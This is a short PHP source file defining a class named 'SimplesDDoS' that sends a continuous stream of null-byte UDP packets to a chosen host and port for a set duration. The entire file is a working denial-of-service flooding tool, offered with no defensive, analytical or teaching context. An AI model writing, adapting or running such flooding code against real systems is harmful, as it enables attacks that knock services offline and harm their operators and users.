<?php
define('DEFAULT_BYTE',"\x00");
define('MAX_PACKET_SIZE',	65000 );
class SimplesDDoS {
  
  private $params = [
    'host' => '',
    'port' => '',
    'packet' => '',
    'time' => '',
    'execution_interval' => '1',
    'bytes' => ''
  ];

  public function __construct($params = []) {
    $this->params = $params;
  } 

  public function start() {
    $packets_count = 0;
    $now_time = time();
    $max_execution_time = $now_time + $this->params['time'];
    $message = str_repeat(DEFAULT_BYTE, $this->params['bytes']);

    while ($now_time < $max_execution_time) {
      $this->generate_udp_connection($this->params['host'],$this->params['port'], $message);
      $now_time = time();
      $packets_count++;
      usleep($this->params['execution_interval'] * 100);
    }
  }

  public function generate_udp_connection($host,$port,$output) {
    $fsocket_connection = fsockopen("udp://{$host}", $port, $errno, $errstr, 30);
    if ($fsocket_connection) {
      if (@fwrite($fsocket_connection, $output)) {
        //sending data success
      } else {
        //sending data error
      }
      fclose($fsocket_connection);
    } else {
      //socket connection error
    }

  }
}

?>